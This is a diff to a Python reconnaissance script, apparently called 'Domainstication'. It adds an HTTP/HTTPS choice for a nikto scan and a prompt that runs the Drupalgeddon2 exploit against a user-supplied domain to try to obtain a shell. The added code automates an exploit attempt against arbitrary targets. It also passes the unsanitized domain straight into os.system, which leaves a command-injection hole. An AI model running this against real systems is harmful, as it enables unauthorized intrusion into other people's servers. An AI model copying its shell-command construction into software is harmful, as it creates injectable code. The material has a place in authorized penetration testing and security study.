@@ -49,8 +49,13 @@ def main():
   print(Fore.CYAN + '[*]Output of Cewl directed to domain_wordlist.lst!')
   print('[*]Running nikto scan...' + Style.RESET_ALL)
   try:
-    os.system('nikto -h https://' + domain + ' -output ../nikto.txt')
-    print(Fore.GREEN + '[+]nikto scan complete!' + Style.RESET_ALL)
+    http = input(Fore.CYAN + '[*]HTT(P) or HTTP(S)?: ' + Style.RESET_ALL)
+    if http == 'P':
+      os.system('nikto -h http://' + domain + ' -output ../nikto.txt')
+      print(Fore.GREEN + '[+]nikto scan complete!' + Style.RESET_ALL)
+    else:
+      os.system('nikto -h https://' + domain + ' -output ../nikto.txt')
+      print(Fore.GREEN + '[+]nikto scan complete!' + Style.RESET_ALL)
   except:
     print(Fore.RED + '[*]Nikto scan incomplete!' + Style.RESET_ALL)
   print(Fore.CYAN + '[*]Output of nikto directed to nikto.txt' + Style.RESET_ALL)
@@ -77,6 +82,20 @@ def main():
   except:
     print(Fore.RED + '[*]Shodan search incomplete!' + Style.RESET_ALL)
   print(Fore.CYAN + '[*]Output of shodan scan directed to shodan.txt!' + Style.RESET_ALL)
+  drupal = input(Fore.CYAN + '[*]Do you want to run DrupalGeddon2 to attempt a shell?[y/N]: ' + Style.RESET_ALL)
+  if drupal == 'y' or drupal == 'Y':
+    try:
+      os.chdir('Drupalgeddon2')
+      http = input(Fore.CYAN + '[*]HTT(P) or HTTP(S)?: ' + Style.RESET_ALL)
+      if http == 'P':
+        os.system('ruby drupalgeddon2.rb http://' + domain + ' > drupal.txt')
+        print(Fore.GREEN + '[+]Drupalgeddon2 attempt complete!' + Style.RESET_ALL)
+      else:
+        os.system('ruby drupalgeddon2.rb https://' + domain + ' > drupal.txt')
+        print(Fore.GREEN + '[+]Drupalgeddon2 attempt complete!' + Style.RESET_ALL)
+    except:
+      print(Fore.RED + '[*]Drupalgeddon2 attemp failed!' + Style.RESET_ALL)
+  os.chdir('..')
   print('=========================================================================')
   print(Fore.GREEN + '[+]Domainstication Complete!' + Style.RESET_ALL)
   wait()
